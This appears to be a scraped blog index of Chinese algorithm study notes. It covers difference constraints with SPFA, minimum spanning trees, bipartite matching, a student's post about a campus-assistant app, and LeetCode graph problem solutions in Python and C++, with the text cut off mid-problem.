dis[i][j]=min(dis[i][j],dis[i][k]+dis[k][j]); &#125; 四、用SPFA解决差分约束问题 差分约束系统就是给出一些形如x-y&lt;=b不等式的约束，问你是否有满足问题的解，或者求最小，最大解。 这个问题的神奇之处是可以转化为图论的最短路问题。 1. 原理 对于图论的最短路径，有：对于d(v) &lt;= d(u) + w(u, v) ，而差分约束系统的解法利用到了单源最短路径问题中的三角形不等式。 移项得：d(v) - d(u) &lt;= w(u, v)，是不是和上面的x-y&lt;=b的一样？ 是的，这就是转化为最短路径算法的原理。 2. 建图 差分约束最难的地方在于建图。 (1) 求最小的解 有一个序列，题目用n个整数组合 [ai，bi，ci]来描述它，[ai，bi，ci]表示在该序列中处于[ai，bi]这个区间的整数至少有ci个。如果存在这样的序列，请求出满足题目要求的最短的序列长度是多少。 我们可以设s[i]为从[1,i]闭区间内的整数个数。 那么显然对于组合[a，b，c] 我们有 s[b] - s[a-1] &gt;= c (a-1是因为我们需要算上a） 还有：0&lt;= s[b]-s[b-1] &lt;=1 变形得 S[b]-S[b-1] &gt;=0 S[b-1]-S[b] &gt;=-1 接着，对于求最小值的来说，我们用最长路来求解。为什么是最长路？一开始把距离d设为无穷小，之后最长路的更新公式为：if(d[v] &lt; d[u]+w(u,v)) d[v]=d[u]+w(u,v); 可以看到d[v]不断的增大，即当满足条件的时候为最小的解。 所以我们在建图的时候，需要满足最长路的三角不等式： d(v) &gt;= d(u) + w(u, v) =&gt;d(v) - d(u) &gt;=w(u,v) 的形式=&gt;从u到v连接一条权重为w(u,v)的边。 故本题中三个不等式都是如下的形式： s[b] - s[a-1] &gt;= c S[b]-S[b-1] &gt;=0 S[b-1]-S[b] &gt;=-1 题解见我CSDN：http://blog.csdn.net/murmured/article/details/18793199 (2) 求最大的解 一些母牛按升序排成一条直线。有两种要求，A和B距离(A&lt;B)不得超过X，还有一种是C和D(C&lt;D)距离不得少于Y，问可能的最大距离。如果没有输出-1，如果可以随便排输出-2，否则输出最大的距离。 题目按升序排，所以有： s[i] - s[i-1] &gt;=0 由题目的约束条件得到： B - A &lt;= X D - C &gt;= Y 因为题目求的是最大距离，故用最短路来求解 最短路三角不等式为 d(v) &lt;= d(u) + w(u,v) =&gt; d(v) - d(u) &lt;= w(u,v) =&gt;从u到v连接一条权重为w(u,v)的边 所以我们都转化为小于等于的符号，所以有： s[i-1] - s[i] &lt;=0 B - A &lt;= X C - D &lt;= -Y 建完图后SPFA即可。（有负环说明无解输出-1 ， 1与n不连通说明可以随意摆放，没有约束嘛。输出-2，否则输出dis [n]） 题解见我CSDN：http://blog.csdn.net/murmured/article/details/18819955 （三）注意点 1.不等式取&gt;=还是&lt;= 当你在纠结用小于号大于号的时候，看看题目求的是最大还是最小，如果只是判断有木有解，那么大于号小于都可以，只不过要注意全部等式要统一。 当求解最大解，使用最短路径求解， 由图最短路径的三角不等式： d(v) &lt;= d(u) + w(u,v) =&gt; d(v) - d(u) &lt;= w(u,v) =&gt;从u到v连接一条权重为w(u,v)的边 求最大的解用最长路，为d(v) - d(u) &lt;= w(u,v) 的形式 求最小的解用最短路，为d(v) - d(u) &gt;= w(u,v) 的形式 2.图不连通 原图可能不是连通图，故需要加一个超级源点S，从S到任意的顶点边权为0，然后从该点出发。为什么？添加从虚点S到每个顶点的权为0的边.这是为了保证构造出来的图是连通的．由于虚点本身并不引入负圈,所以设置虚点以后最短路仍然存在,并且每个约束仍然满足. 或者差分约束不用什么附加顶点, 附加顶点的唯一用处就是保证图的连通性, 不让你有负环判不到的情况, 解决这种问题的最佳途径就是初始把所有顶点都加入队列, 并且将所有dis 置0, 这就相当于加了一个不存在的附加顶点, 它与所有的顶点的直连长度都是0. 当然推荐第二种，效率也高。 最小生成树 MST 一、prim prim和dijkstra其实差不多，都是选取待选集合中到已选集合中距离最小的点。就是更新的方程不一样。 prim的dis指的是连接到已知顶点最小边的权值（也就是之后生成MST的边） 所以dis[j] = min(dis[j] , map[cur][j]); 代码实现如下： 12345678910111213141516171819202122232425int prim()&#123;int dis[MAXN];bool vis[MAXN]=&#123;0&#125;;for(int i=0;i&lt;n;i++) dis[i] = INF;int cur = 0;dis[cur]=0;vis[cur]=true;for(int i=0;i&lt;n;i++)&#123; for(int j=0;j&lt;n;j++) if(!vis[j] &amp;&amp; dis[j] &gt; map[cur][j]) dis[j] = map[cur][j]; int mini = INF; for(int j=0;j&lt;n;j++) if(!vis[j] &amp;&amp; dis[j] &lt; mini) mini = dis[cur = j]; vis[cur] = true; &#125; int ans=0; for(int i=0;i&lt;n;i++) ans+=dis[i]; return ans;&#125; 二、kruskal kruskal的原理是将顶点分为若干个集合，每次选取不在集合内部的最小的边，不断的将各个集合连接起来，最后构成MST。 简单的说就是先按边排个序，然后遍历每条边，判断边的两个顶点是否在同一集合中（用并查集） 代码实现如下 1234567891011121314151617181920212223242526struct Edge&#123;int from,to,val;bool operator &lt; (const Edge &amp;x)const&#123;return val &lt; x.val;&#125;&#125;e[MAXN * MAXN];int fa[MAXN],len=0;int find(int cur)&#123; return cur==fa[cur]?cur:fa[cur]=find(fa[cur]); &#125;int kruskal()&#123; for(int i=0;i&lt;n;i++) fa[i] = i; sort(e,e+len); int ans=0; for(int i = 0;i &lt; len;i++)&#123; int rootx=find(e[i].from); int rooty=find(e[i].to); if(rootx==rooty) continue; fa[rootx]=rooty; ans += e[i].val; &#125; return ans;&#125; 三、次小生成树 二分图 一、基本概念 二分图：其所有顶点可以分成两个集合X和Y，在同一集合中的点都不相连，所有的边关联在两个顶点中，恰好一个属于集合X，另一个属于集合Y。 二分图匹配：在图论中，一个「匹配」（matching）是一个边的集合，其中任意两条边都没有公共顶点。 最大匹配：一个图所有匹配中，所含匹配边数最多的匹配，称为这个图的最大匹配。 完美匹配：如果一个图的某个匹配中，所有的顶点都是匹配点，那么它就是一个完美匹配。完美匹配一定是最大匹配但并非每个图都存在完美匹配。 最小顶点覆盖：在顶点集合中，选取一部分顶点，这些顶点能够把所有的边都覆盖了。在所有的顶点覆盖集中，顶点数最小的那个叫最小顶点集合。 路径覆盖：在图中找一些路径，这些路径覆盖图中所有的顶点，每个顶点都只与一条路径相关联。 独立集：在所有的顶点中选取一些顶点，这些顶点两两之间没有连线，这些点就叫独立集 二、几个关系 最大匹配 = 最小顶点覆盖 最大独立集 = 最小路径覆盖 =总节点数 – 最小顶点覆盖（最大匹配） 最小路径覆盖 = 总节点数 – 最小顶点覆盖（最大匹配） 的一种解释：如果无匹配，需要n条路径才能覆盖所有点，两个点匹配意味着将可以把它们用一条路径覆盖，路径数就可以减1 三、求解 求二分图最大匹配可以用最大流(Maximal Flow)或者匈牙利算法(Hungarian Algorithm) 1.匈牙利算法实现 1234567891011121314151617bool find(int a) &#123; for(int i=head[a];i!=-1;i=e[i].next) &#123; int id=e[i].to; if(!vis[id]) &#123; vis[id]=true; if(res[id]==0 find(res[id])) &#123; res[id]=a; return true; &#125; &#125; &#125; return false; &#125; 如下的方式调用： 1234for(int i=1;i&lt;=n;i++) &#123; memset(vis,0,sizeof(vis)); if(find(i)) ans++; &#125;","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"算法笔记","slug":"study/算法笔记","permalink":"https://www.hrwhisper.me/categories/study/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"Data Structure","slug":"Data-Structure","permalink":"https://www.hrwhisper.me/tags/Data-Structure/"}]},{"title":"ruc assistant","slug":"ruc-assistant","date":"2015-07-02T03:45:02.000Z","updated":"2021-01-08T13:42:14.031Z","comments":true,"path":"ruc-assistant/","link":"","permalink":"https://www.hrwhisper.me/ruc-assistant/","excerpt":"人大助手的创作过程及感想啥的。","text":"人大助手的创作过程及感想啥的。 一、需求分析 需求简单的说就是爬取微人大的成绩、课表、课程信息、图书馆的借阅信息和书籍信息（查书） 二、技术问题及解决 1.模拟登陆 要爬取微人大的成绩啥的，就需要模拟登陆，不登陆不给查啊。 于是先用python进行尝试。 如下：python模拟登陆微人大 现学现卖模拟登陆的，很快就搞定了~ 2.HTML网页信息处理 我用的是jsoup。很好解决了。 3.安卓网络通信 用的httpclient，必须使用线程，貌似是安卓4.0以后的规则，为了防止后台执行时间过长导致界面无响应。。。 4.安卓语法啥的 虽然以前学过一点，但很多还是现学现卖 三、总结 其实实现问题上还存在一些问题 比如说，应该采用中间服务器，来减少android/IOS客户端两个开发人员的负担。就是使用中间的服务器来进行处理HTML，返回给android/IOS客户端，而不是两个码农在那分别写。（这是考虑到长久使用才这么干的。。下学期老师说回收服务器，所以我压根不想用= =） 应采用中间服务器 分工太差 99%都是我写的我就不说啥了/(ㄒoㄒ)/~~ 应该一个写服务器，一个安卓，一个IOS 话说IOS又不发布，写它干啥= = 多写多学点吧 T^T 界面太丑 说是找的妹纸设计。。可是设计成这样。。。我又不好意思吐槽。。。。 界面设计的这些线完全没考虑到多分辨率的问题啊 本来就不是很好看啊！！！ 我把线去掉了还被嫌弃丑T^T 我又不是美工的昂 下次用google Material Design吧 推广推广 QAQ夭折啊 不开森 代码：https://github.com/hrwhisper/rucAssistant","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"课程设计","slug":"study/课程设计","permalink":"https://www.hrwhisper.me/categories/study/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}],"tags":[]},{"title":"leetcode Graph 图论","slug":"leetcode-graph","date":"2015-06-23T02:35:42.000Z","updated":"2021-01-31T09:12:58.179Z","comments":true,"path":"leetcode-graph/","link":"","permalink":"https://www.hrwhisper.me/leetcode-graph/","excerpt":"本次题解包括 133 Clone Graph 207 Course Schedule 210 Course Schedule II 547 Number of Provinces 684 冗余连接 803 打砖块 947 移除最多的同行或同列石头 1202. Smallest String With Swaps 连通网络的操作次数","text":"本次题解包括 133 Clone Graph 207 Course Schedule 210 Course Schedule II 547 Number of Provinces 684 冗余连接 803 打砖块 947 移除最多的同行或同列石头 1202. Smallest String With Swaps 连通网络的操作次数 133. leetcode Clone Graph Clone an undirected graph. Each node in the graph contains a label and a list of its neighbors. 题目地址： leetcode Clone Graph 题意：给定一张图，要求进行深拷贝 思路：leetcode之前唯一的图。。 用BFS/DFS对图进行遍历，我使用字典（c++叫Map)建立起旧结点和新结点的映射关系，这样就好复制啦。 123456789101112131415161718class Solution: # @return a undirected graph node def cloneGraph(self, node): if not node:return None head=UndirectedGraphNode(node.label) q,vis,dic=[],set([node]),&#123;&#125; dic[node]=head q.append(node) while q: cur = q.pop() for i in cur.neighbors: if i not in dic: dic[i]=UndirectedGraphNode(i.label) dic[cur].neighbors.append(dic[i]) if i not in vis: q.append(i) vis.add(i) return head 附上我的测试代码 1234567891011121314151617181920212223242526class UndirectedGraphNode: def __init__(self, x): self.label = x self.neighbors = []def printGraph(node): q ,vis = [],set([node]) q.append(node) while q: cur = q.pop(0) print &#x27; &#x27;,cur.label for i in cur.neighbors: print i.label if i not in vis: q.append(i) vis.add(i)s=Solution()one = UndirectedGraphNode(1)two = UndirectedGraphNode(2)three =UndirectedGraphNode(3)one.neighbors.append(one)one.neighbors.append(two)two.neighbors.append(three)#printGraph(one)printGraph( s.cloneGraph(one)) 207. leetcode Course Schedule There are a total of n courses you have to take, labeled from 0 to n - 1. Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: [0,1] Given the total number of courses and a list of prerequisite pairs, is it possible for you to finish all courses? For example: 12, [[1,0]] There are a total of 2 courses to take. To take course 1 you should have finished course 0. So it is possible. 12, [[1,0],[0,1]] There are a total of 2 courses to take. To take course 1 you should have finished course 0, and to take course 0 you should also have finished course 1. So it is impossible. 题目地址： leetcode Course Schedule 题意：给定一些课程，以及他们课程之间先修的关系。如我要修课程1，必须先修完课程0，问是否有可能完成这些课程。 思路：很明显的问题可以转化为求拓扑排序（Topological Sort）。 拓扑排序的做法如下： 每次找入度为0的点，输出该入度为0的点，并删除与之相连接的边 重复1直到没有入度为0的点。之前输出入度为0的点若小于原图的结点数，那么说明图有环，即拓扑排序不存在，否则即为拓扑排序。 以下面的为例： Topological Sort 在(a)图中v0和v1的入度都为0，选择v0并输出，接着删去顶点v0及出边&lt;0,2&gt;，得到的结果如(b)图所示。 在(b)图中只有一个入度为0的顶点v1，输出v1，接着删去v1和它的三条出边&lt;1,2&gt;,&lt;1,3&gt;和&lt;1,4&gt;，得到的结果如(c)图所示。 在(c)图中v2和v4的入度都为0，不妨选择v2并输出之，接着删去v2及两条出边&lt;2,3&gt;和&lt;2,5&gt;，得到的结果如(d)图所示。 在(d)图上依次输出顶点v3,v4和v5，并在每个顶点输出后删除该顶点及出边。 C++ 12345678910111213141516171819202122class Solution &#123;public: bool canFinish(int numCourses, vector&lt;pair&lt;int, int&gt;&gt;&amp; prerequisites) &#123; vector&lt;vector&lt;int&gt; &gt; g(numCourses); vector&lt;int&gt; in_degree(numCourses, 0); for (int i = 0; i &lt; prerequisites.size(); i++)&#123; g[prerequisites[i].second].push_back(prerequisites[i].first); in_degree[prerequisites[i].first]++; &#125; queue&lt;int&gt; q; for (int i = 0; i &lt; numCourses; i++) if (in_degree[i] == 0) q.push(i); while (!q.empty())&#123; int cur = q.front(); q.pop(); for (auto it = g[cur].begin(); it != g[cur].end(); it++) if (--in_degree[*it] == 0) q.push(*it); &#125; for (int i = 0; i &lt; numCourses; i++) if (in_degree[i] != 0) return false; return true; &#125;&#125;; 210. leetcode Course Schedule II There are a total of n courses you have to take, labeled from 0 to n - 1. Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: [0,1] Given the total number of courses and a list of prerequisite pairs, return the ordering of courses you should take to finish all courses. There may be multiple correct orders, you just need to return one of them. If it is impossible to finish all courses, return an empty array. For example: 12, [[1,0]] There are a total of 2 courses to take. To take course 1 you should have finished course 0. So the correct course order is [0,1] 14, [[1,0],[2,0],[3,1],[3,2]] There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. So one correct course order is [0,1,2,3]. Another correct ordering is[0,2,1,3]. 题目地址： leetcode Course Schedule II 题意：和207那题一样，给定各种课程之间依赖关系，求一个满足条件的顺序。 思路：其实就是输出拓扑排序啦~直接上面那题代码改改即可。 1234567891011121314151617181920212223242526class Solution &#123;public: vector&lt;int&gt; findOrder(int numCourses, vector&lt;pair&lt;int, int&gt;&gt;&amp; prerequisites) &#123; vector&lt;vector&lt;int&gt; &gt; g(numCourses); vector&lt;int&gt; in_degree(numCourses, 0); vector&lt;int&gt; ans; for (int i = 0; i &lt; prerequisites.size(); i++)&#123; g[prerequisites[i].second].push_back(prerequisites[i].first); in_degree[prerequisites[i].first]++; &#125; queue&lt;int&gt; q; int cnt = 0; for (int i = 0; i &lt; numCourses; i++) if (in_degree[i] == 0) q.push(i); while (!q.empty())&#123; int cur = q.front(); ans.push_back(cur); q.pop(); for (auto it = g[cur].begin(); it != g[cur].end(); it++) if (--in_degree[*it] == 0) q.push(*it); &#125; if (ans.size() == numCourses) return ans; ans.clear(); return ans; &#125;&#125;; 547. 省份数量 有 n 个城市，其中一些彼此相连，另一些没有相连。如果城市 a 与城市 b 直接相连，且城市 b 与城市 c 直接相连，那么城市 a 与城市 c 间接相连。 省份 是一组直接或间接相连的城市，组内不含其他没有相连的城市。 给你一个 n x n 的矩阵 isConnected ，其中 isConnected[i][j] = 1 表示第 i 个城市和第 j 个城市直接相连，而 isConnected[i][j] = 0 表示二者不直接相连。 返回矩阵中 省份 的数量。 示例 1： img 12&gt;输入：isConnected &#x3D; [[1,1,0],[1,1,0],[0,0,1]]&gt;输出：2 示例 2： img 12&gt;输入：isConnected &#x3D; [[1,0,0],[0,1,0],[0,0,1]]&gt;输出：3 提示： 1 &lt;= n &lt;= 200 n == isConnected.length n == isConnected[i].length isConnected[i][j] 为 1 或 0 isConnected[i][i] == 1 isConnected[i][j] == isConnected[j][i] 方法1：dfs即可 123456789101112131415161718class Solution: def findCircleNum(self, isConnected: List[List[int]]) -&gt; int: vis = [False] * len(isConnected) ans = 0 for i in range(len(isConnected)): if vis[i]: continue ans += 1 vis[i] = True self.dfs(i, isConnected, vis) return ans def dfs(self, cur, isConnected, vis): row = isConnected[cur] for i in range(len(row)): if row[i] and not vis[i]: vis[cur] = True self.dfs(i, isConnected, vis) 方法2： 并查集 1234567891011121314151617class Solution: def findCircleNum(self, isConnected: List[List[int]]) -&gt; int: fa = list(range(len(isConnected))) for i in range(len(isConnected)): for j in range(i): if isConnected[i][j]: root_x = self.find(i, fa) root_y = self.find(j, fa) if root_x != root_y: fa[root_y] = root_x return sum([1 if i == fa[i] else 0 for i in range(len(isConnected))]) def find(self, cur, fa): if fa[cur] == cur: return cur fa[cur] = self.find(fa[cur], fa) return fa[cur] 684. 冗余连接 在本问题中, 树指的是一个连通且无环的无向图。 输入一个图，该图由一个有着N个节点 (节点值不重复1, 2, ..., N) 的树及一条附加的边构成。附加的边的两个顶点包含在1到N中间，这条附加的边不属于树中已存在的边。 结果图是一个以边组成的二维数组。每一个边的元素是一对[u, v] ，满足 u &lt; v，表示连接顶点u 和v的无向图的边。 返回一条可以删去的边，使得结果图是一个有着N个节点的树。如果有多个答案，则返回二维数组中最后出现的边。答案边 [u, v] 应满足相同的格式 u &lt; v。 示例 1： 123456&gt;输入: [[1,2], [1,3], [2,3]]&gt;输出: [2,3]&gt;解释: 给定的无向图为: 1&#x2F; \\&gt;2 - 3 示例 2： 123456&gt;输入: [[1,2], [2,3], [3,4], [1,4], [1,5]]&gt;输出: [1,4]&gt;解释: 给定的无向图为:&gt;5 - 1 - 2 | | 4 - 3 注意: 输入的二维数组大小在 3 到 1000。 二维数组中的整数在1到N之间，其中N是输入数组的大小。 更新(2017-09-26): 我们已经重新检查了问题描述及测试用例，明确图是无向 图。对于有向图详见冗余连接II。对于造成任何不便，我们深感歉意。 低配版本的kruskal算法（不像MST要排序），并查集即可 12345678910111213141516171819202122class Solution: def findRedundantConnection(self, edges: List[List[int]]) -&gt; List[int]: max_n = 0 for edge in edges: max_n = max(max_n, edge[1]) fa = [i for i in range(max_n + 1)] for edge in edges: x, y = edge root_x = self.find(x, fa) root_y = self.find(y, fa) if root_x != root_y: fa[root_y] = root_x else: return edge return [] def find(self, x, fa): if x != fa[x]: fa[x] = self.find(fa[x], fa) return fa[x] 778. 水位上升的泳池中游泳 在一个 N x N 的坐标方格 grid 中，每一个方格的值 grid[i][j] 表示在位置 (i,j) 的平台高度。 现在开始下雨了。当时间为 t 时，此时雨水导致水池中任意位置的水位为 t 。你可以从一个平台游向四周相邻的任意一个平台，但是前提是此时水位必须同时淹没这两个平台。假定你可以瞬间移动无限距离，也就是默认在方格内部游动是不耗时的。当然，在你游泳的时候你必须待在坐标方格里面。 你从坐标方格的左上平台 (0，0) 出发。最少耗时多久你才能到达坐标方格的右下平台 (N-1, N-1)？ 示例 1: 1234567&gt;输入: [[0,2],[1,3]]&gt;输出: 3&gt;解释:&gt;时间为0时，你位于坐标方格的位置为 (0, 0)。&gt;此时你不能游向任意方向，因为四个相邻方向平台的高度都大于当前时间为 0 时的水位。&gt;等时间到达 3 时，你才可以游向平台 (1, 1). 因为此时的水位是 3，坐标方格中的平台没有比水位 3 更高的，所以你可以游向坐标方格中的任意位置 示例2: 1234567891011&gt;输入: [[0,1,2,3,4],[24,23,22,21,5],[12,13,14,15,16],[11,17,18,19,20],[10,9,8,7,6]]&gt;输出: 16&gt;解释:0 1 2 3 4&gt;24 23 22 21 5&gt;12 13 14 15 16&gt;11 17 18 19 20&gt;10 9 8 7 6&gt;最终的路线用加粗进行了标记。&gt;我们必须等到时间为 16，此时才能保证平台 (0, 0) 和 (4, 4) 是连通的 提示: 2 &lt;= N &lt;= 50. grid[i][j] 是 [0, ..., N*N - 1] 的排列。 方法1 最短路 用dijkstra算法，能到达点b的权值为max(weight_b, cur.weight) ，一个是路上累计的最大，一个是当前b点的权值。 123456789101112131415161718192021222324252627282930313233343536373839struct Node &#123; int x; int y; int t; Node(int i, int j, int t) : x(i), y(j), t(t) &#123;&#125; bool operator&lt; (const Node&amp; o) const &#123; return t &gt; o.t; &#125;&#125;;class Solution &#123;public: int swimInWater(vector&lt;vector&lt;int&gt;&gt;&amp; grid) &#123; priority_queue&lt;Node&gt; q; const int n = grid.size(); vector&lt;vector&lt;bool&gt;&gt; vis(n, vector&lt;bool&gt;(n, false)); q.push(Node(0, 0, grid[0][0])); int dx[] = &#123;1, -1, 0, 0&#125;; int dy[] = &#123;0, 0, 1, -1&#125;; while (!q.empty()) &#123; Node cur = q.top(); q.pop(); if (cur.x == n - 1 &amp;&amp; cur.y == n - 1) &#123; return cur.t; &#125; if (vis[cur.x][cur.y]) continue; vis[cur.x][cur.y] = true; for (int i = 0; i &lt; 4; ++i) &#123; int nx = cur.x + dx[i]; int ny = cur.y + dy[i]; if (nx &lt; 0 || ny &lt; 0 || nx == n || ny == n || vis[nx][ny]) &#123; continue; &#125; q.push(Node(nx, ny, max(grid[nx][ny], cur.t))); &#125; &#125; return -1; &#125;&#125;; 方法2 并查集 将权值从小到大排序（由于本题为0～n*n-1，可以用类似计数排序），然后遍历权值，若当前权值大于四周的点，则可以合并两个连通分支，因为在当前的时刻t，可以到当前的点必然也能到相邻的点。若加入某个点后起点和终点连通，则找到了解 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758class UnionFind &#123;public: UnionFind(int n) &#123; _fa.resize(n, 0); for (int i = 0; i &lt; n; ++i) &#123; _fa[i] = i; &#125; &#125; int find(int x) &#123; return _fa[x] == x ? x : _fa[x] = find(_fa[x]); &#125; void union_fa(int x, int y) &#123; int root_x = find(x); int root_y = find(y); if (root_x != root_y) &#123; _fa[root_x] = root_y; &#125; &#125;private: vector&lt;int&gt; _fa;&#125;;class Solution &#123;public: int swimInWater(vector&lt;vector&lt;int&gt;&gt;&amp; grid) &#123; const int n = grid.size(); UnionFind uf(n * n); vector&lt;pair&lt;int, int&gt;&gt; idx(n * n); for (int i = 0; i &lt; n; ++i) &#123; for (int j = 0; j &lt; n; ++j) &#123; idx[grid[i][j]] = std::make_pair(i, j); &#125; &#125; const int max_t = n * n - 1; vector&lt;int&gt; dx = &#123;0, 0, 1, -1&#125;; vector&lt;int&gt; dy = &#123;1, -1, 0, 0&#125;; for (int cur_t = 0; cur_t &lt;= max_t; ++cur_t) &#123; auto [x, y] = idx[cur_t]; for (int i = 0; i &lt; 4; ++i) &#123; int nx = x + dx[i]; int ny = y + dy[i]; if (nx &lt; 0 || ny &lt; 0 || nx == n || ny == n || grid[nx][ny] &gt; cur_t) &#123; continue; &#125; uf.union_fa(x * n + y, nx * n + ny); &#125; if (uf.find(0) == uf.find(n * n - 1)) &#123; return cur_t; &#125; &#125; return -1; &#125;&#125;; 方法3 类似1631二分搜索 803. 打砖块 有一个 m x n 的二元网格，其中 1 表示砖块，0 表示空白。砖块 稳定（不会掉落）的前提是： 一块砖直接连接到网格的顶部，或者 至少有一块相邻（4 个方向之一）砖块 稳定 不会掉落时 给你一个数组 hits ，这是需要依次消除砖块的位置。每当消除 hits[i] = (rowi, coli) 位置上的砖块时，对应位置的砖块（若存在）会消失，然后其他的砖块可能因为这一消除操作而掉落。一旦砖块掉落，它会立即从网格中消失（即，它不会落在其他稳定的砖块上）。 返回一个数组 result ，其中 result[i] 表示第 i 次消除操作对应掉落的砖块数目。 注意，消除可能指向是没有砖块的空白位置，如果发生这种情况，则没有砖块掉落。 示例 1： 12345678910111213&gt;输入：grid &#x3D; [[1,0,0,0],[1,1,1,0]], hits &#x3D; [[1,0]]&gt;输出：[2]&gt;解释：&gt;网格开始为：&gt;[[1,0,0,0]，[1,1,1,0]]&gt;消除 (1,0) 处加粗的砖块，得到网格：&gt;[[1,0,0,0][0,1,1,0]]&gt;两个加粗的砖不再稳定，因为它们不再与顶部相连，也不再与另一个稳定的砖相邻，因此它们将掉落。得到网格：&gt;[[1,0,0,0],[0,0,0,0]]&gt;因此，结果为 [2] 。 示例 2： 1234567891011121314151617&gt;输入：grid &#x3D; [[1,0,0,0],[1,1,0,0]], hits &#x3D; [[1,1],[1,0]]&gt;输出：[0,0]&gt;解释：&gt;网格开始为：&gt;[[1,0,0,0],[1,1,0,0]]&gt;消除 (1,1) 处加粗的砖块，得到网格：&gt;[[1,0,0,0],[1,0,0,0]]&gt;剩下的砖都很稳定，所以不会掉落。网格保持不变：&gt;[[1,0,0,0], [1,0,0,0]]&gt;接下来消除 (1,0) 处加粗的砖块，得到网格：&gt;[[1,0,0,0],[0,0,0,0]]&gt;剩下的砖块仍然是稳定的，所以不会有砖块掉落。&gt;因此，结果为 [0,0] 。 提示： m == grid.length n == grid[i].length 1 &lt;= m, n &lt;= 200 grid[i][j] 为 0 或 1 1 &lt;= hits.length &lt;= 4 * 104 hits[i].length == 2 0 &lt;= xi &lt;= m - 1 0 &lt;= yi &lt;= n - 1 所有 (xi, yi) 互不相同 并查集+逆向思维法。 首先，一块砖是稳定的仅当与屋顶连接，或者周围4个方块有一个是稳定的。当我们消除一个砖块的时候，可能会破坏这个稳定的结构，导致一堆砖块掉落。 注意到一块砖是稳定的=&gt;说明它直接或间接的和屋顶连接=》其他和该砖头连接的都可以看成是一个稳定的连通子图。因此感觉可以用并查集来做。但是并查集是相当于是对两个连通子图的合并，而这道题消除砖块变成连通分量的分解，因此可以考虑逆向思维。 消除所有hits的砖块，即将grid中在hits数组对应的位置上都设置为0 可以首先将与屋顶连接的砖块看成同一个连通分量，因为和任意一个连接都没有什么区别。因此用并查集将他们合并 初始化其他的砖块，将数值为1的合并起来 经过2和3，就形成了若干个连通分量 逆序遍历hits数组，对位置x ,y ： 首先确保这个位置原先是1，否则相当于hit了空的位置，这里不该补上1 如果x == 0说明这个砖块是和屋顶直接连接的，要先和屋顶合并一下（否则可能这个砖头连接的其他的砖头都不和屋顶连接了） 合并x, y周围的联通分量 设pre_num为合并前屋顶联通分量的儿子的数目，after_num为合并后的数量，则通过补上x,y 连接了after_num - pre_num - 1的数量 代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273class Solution: dx = [0, 0, -1, 1] dy = [1, -1, 0, 0] def hitBricks(self, grid: List[List[int]], hits: List[List[int]]) -&gt; List[int]: origin_grid = copy.deepcopy(grid) for x, y in hits: grid[x][y] = 0 self.m, self.n = len(grid), len(grid[0]) roof_key = self.get_key(self.m, self.n) # 屋顶的key unionfind = UnionFind(roof_key + 1) for j in range(self.n): if grid[0][j] == 1: unionfind.union(self.get_key(0, j), roof_key) for i in range(1, self.m): for j in range(self.n): if grid[i][j] == 0: continue if grid[i - 1][j]: unionfind.union(self.get_key(i, j), self.get_key(i - 1, j)) if j and grid[i][j - 1]: unionfind.union(self.get_key(i, j), self.get_key(i, j - 1)) ans = [] for x, y in hits[::-1]: if origin_grid[x][y] == 0: ans.append(0) continue cur_key = self.get_key(x, y) pre_num = unionfind.get_count(roof_key) if x == 0: unionfind.union(cur_key, roof_key) for i in range(4): nx, ny = x + self.dx[i], y + self.dy[i] if nx &lt; 0 or ny &lt; 0 or nx &gt;= len(grid) or ny &gt;= len(grid[0]) or \\ not grid[nx][ny]: continue unionfind.union(cur_key, self.get_key(nx, ny)) after_num = unionfind.get_count(roof_key) cur = max(after_num - pre_num - 1, 0) ans.append(cur) grid[x][y] = 1 return ans[::-1] def get_key(self, x, y): return x * self.n + yclass UnionFind(object): def __init__(self, n): self.fa = [i for i in range(n)] self.counter = [1] * n def find(self, x): if x != self.fa[x]: self.fa[x] = self.find(self.fa[x]) return self.fa[x] def union(self, x, y): root_x = self.find(x) root_y = self.find(y) if root_x == root_y: return self.fa[root_y] = root_x self.counter[root_x] += self.counter[root_y] def get_count(self, x): root_x = self.find(x) return self.counter[root_x] 947. 移除最多的同行或同列石头 n 块石头放置在二维平面中的一些整数坐标点上。每个坐标点上最多只能有一块石头。 如果一块石头的 同行或者同列 上有其他石头存在，那么就可以移除这块石头。 给你一个长度为 n 的数组 stones ，其中 stones[i] = [xi, yi] 表示第 i 块石头的位置，返回 可以移除的石子 的最大数量。 示例 1： 123456789&gt;输入：stones &#x3D; [[0,0],[0,1],[1,0],[1,2],[2,1],[2,2]]&gt;输出：5&gt;解释：一种移除 5 块石头的方法如下所示：&gt;1. 移除石头 [2,2] ，因为它和 [2,1] 同行。&gt;2. 移除石头 [2,1] ，因为它和 [0,1] 同列。&gt;3. 移除石头 [1,2] ，因为它和 [1,0] 同行。&gt;4. 移除石头 [1,0] ，因为它和 [0,0] 同列。&gt;5. 移除石头 [0,1] ，因为它和 [0,0] 同行。&gt;石头 [0,0] 不能移除，因为它没有与另一块石头同行&#x2F;列。 示例 2： 1234567&gt;输入：stones &#x3D; [[0,0],[0,2],[1,1],[2,0],[2,2]]&gt;输出：3&gt;解释：一种移除 3 块石头的方法如下所示：&gt;1. 移除石头 [2,2] ，因为它和 [2,0] 同行。&gt;2. 移除石头 [2,0] ，因为它和 [0,0] 同列。&gt;3. 移除石头 [0,2] ，因为它和 [0,0] 同行。&gt;石头 [0,0] 和 [1,1] 不能移除，因为它们没有与另一块石头同行&#x2F;列。 示例 3： 123&gt;输入：stones &#x3D; [[0,0]]&gt;输出：0&gt;解释：[0,0] 是平面上唯一一块石头，所以不可以移除它。 提示： 1 &lt;= stones.length &lt;= 1000 0 &lt;= xi, yi &lt;= 10^4 不会有两块石头放在同一个坐标点上 题目说，如果一块石头的 同行或者同列 上有其他石头存在，那么就可以移除这块石头。 